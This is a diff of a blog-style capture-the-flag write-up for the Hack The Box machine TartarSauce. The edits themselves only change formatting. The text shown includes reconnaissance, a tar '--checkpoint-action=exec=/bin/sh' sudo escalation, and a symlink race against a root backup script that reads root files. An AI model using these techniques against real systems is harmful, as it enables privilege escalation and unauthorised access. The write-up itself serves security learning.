@@ -11,7 +11,7 @@ author: Derrick
 Tartarsauce is an odd box because I was never actually able to gain a root shell on it. The box deals a lot with using tar to pivot or escelate privileges. Its probably where the box got its name from. The author seemed to have a lot of fun putting little jokes throughout the box.
 
 ## Recon
-
+---
 `nmap -sVC 10.10.10.88`
 ``` 
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-09 21:56 EDT
@@ -57,9 +57,8 @@ curl http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/frontend
 ```
 
 ## User
-
+---
 Run `sudo -l` to discover:
-
 ```
 Matching Defaults entries for www-data on TartarSauce:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
@@ -73,7 +72,7 @@ User www-data may run the following commands on TartarSauce:
 `sudo -u onuma /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`
 
 ## Root
-
+---
 Interesting pspy output:
 ```
 2022/06/11 01:14:10 CMD: UID=0    PID=28941  | /bin/bash /usr/sbin/backuperer
@@ -143,12 +142,9 @@ else
 fi
 ```
 
-Basically, its backing up the webroot and pauses for 30 sec. After 30 seconds, it checks to see if there has been any changes to the webroot and the archive it just created. Any changes get diffed. Since diff outputs the differences and outputs into a file AND this is run as root, this is essentially root file read.
-
-Within that 30 second gap, remove an existing file and replace it with a symlink to root.txt. To see when the script executes, pay attention to pspy.
+Basically, its backing up the webroot and pauses for 30 sec. After 30 seconds, it checks to see if there has been any changes to the webroot and the archive it just created. Any changes get diffed. Since diff outputs the differences and outputs into a file AND this is run as root, this is essentially root file read. Within that 30 second gap, remove an existing file and replace it with a symlink to root.txt. To see when the script executes, pay attention to pspy.
 
 Demo:
-
 ```
 www-data@TartarSauce.htb: $ ls 
 index.html  robots.txt  webservices
@@ -169,5 +165,4 @@ diff -r /var/www/html/lmao.txt /var/tmp/check/var/www/html/lmao.txt
 > fart
 ```
 
-This POC works.
-Just add in the `/root/root.txt` file and this should be pwned :)
+This POC works. Just add in the `/root/root.txt` file and this should be pwned :)
